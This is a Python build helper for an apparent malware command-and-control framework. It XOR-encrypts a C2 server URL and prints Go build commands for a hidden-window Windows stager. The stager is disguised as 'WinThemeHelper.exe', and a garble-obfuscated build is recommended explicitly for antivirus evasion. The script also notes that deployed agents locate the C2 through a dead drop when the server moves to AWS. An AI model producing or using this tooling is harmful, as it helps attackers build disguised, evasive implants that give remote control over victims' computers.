#!/usr/bin/env python3
"""
Generate the -ldflags values for building c3po-stager.exe.

Usage:
  python3 scripts/encrypt_c2.py <c2_url> [key]

Examples:
  python3 scripts/encrypt_c2.py http://10.0.0.208:9000
  python3 scripts/encrypt_c2.py http://54.x.x.x:9000 myk3y
  python3 scripts/encrypt_c2.py https://myc2.example.com c3p0stgr

The output is the -ldflags string to paste directly into the build command.
"""

import sys

def xor_encrypt(plaintext: str, key: str) -> str:
    key_bytes = key.encode()
    return ''.join(f'{ord(c) ^ key_bytes[i % len(key_bytes)]:02x}'
                   for i, c in enumerate(plaintext))

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    c2_url = sys.argv[1].rstrip('/')
    key    = sys.argv[2] if len(sys.argv) > 2 else 'c3p0stgr'

    encrypted = xor_encrypt(c2_url, key)

    print(f"\nC2 URL  : {c2_url}")
    print(f"XOR key : {key}")
    print(f"Encrypted (hex): {encrypted}")
    print()
    print("── Build command ────────────────────────────────────────────────────")
    print(f"cd stager && \\")
    print(f"GOOS=windows GOARCH=amd64 go build \\")
    print(f'  -ldflags "-s -w -H windowsgui \\')
    print(f'    -X main.StagerKey={key} \\')
    print(f'    -X main.C2Crypt={encrypted} \\')
    print(f'    -X main.DropName=WinThemeHelper.exe" \\')
    print(f'  -o ../c3po-stager.exe .')
    print()
    print("── With garble (recommended for AV evasion) ─────────────────────────")
    print(f"cd stager && \\")
    print(f"garble -literals -seed=random build \\")
    print(f'  -ldflags "-s -w -H windowsgui \\')
    print(f'    -X main.StagerKey={key} \\')
    print(f'    -X main.C2Crypt={encrypted} \\')
    print(f'    -X main.DropName=WinThemeHelper.exe" \\')
    print(f'  -o ../c3po-stager.exe .')
    print()
    print("── To move C2 to AWS later ──────────────────────────────────────────")
    print(f"  Just re-run:  python3 scripts/encrypt_c2.py http://<aws-ip>:9000 {key}")
    print(f"  Rebuild stager. Existing deployed agents find C2 via the dead drop.")

if __name__ == '__main__':
    main()
